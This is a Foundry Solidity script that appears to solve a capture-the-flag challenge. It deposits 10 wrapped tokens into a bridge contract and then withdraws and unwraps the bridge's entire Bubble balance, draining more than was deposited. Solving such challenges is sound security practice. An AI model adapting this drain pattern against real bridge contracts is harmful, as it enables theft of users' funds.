// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import {Script, console} from "forge-std/Script.sol";
import {Setup, Bridge, Bubble, Feather} from "./challenge/eth/src/Setup.sol";

contract ExploitScript is Script {
    function prepare(address setupAddr) public {
        vm.startBroadcast();

        address playerAddr = msg.sender;

        Setup setup = Setup(setupAddr);
        Feather feather = setup.feather();
        Bubble bubble = setup.bubble();
        Bridge bridge = setup.bridge();

        setup.airdrop();

        assert(feather.balanceOf(playerAddr) == 10);

        feather.approve(address(bubble), 10);
        bubble.wrap(10);

        assert(bubble.balanceOf(playerAddr) == 10);

        bubble.approve(address(bridge), 10);
        bridge.deposit(10);

        vm.stopBroadcast();
    }

    function solve(address setupAddr) public {
        vm.startBroadcast();

        Setup setup = Setup(setupAddr);
        Bubble bubble = setup.bubble();
        Bridge bridge = setup.bridge();

        uint256 balance = bubble.balanceOf(address(bridge));
        bridge.withdraw(balance);
        bubble.unwrap(balance);

        vm.stopBroadcast();
    }
}
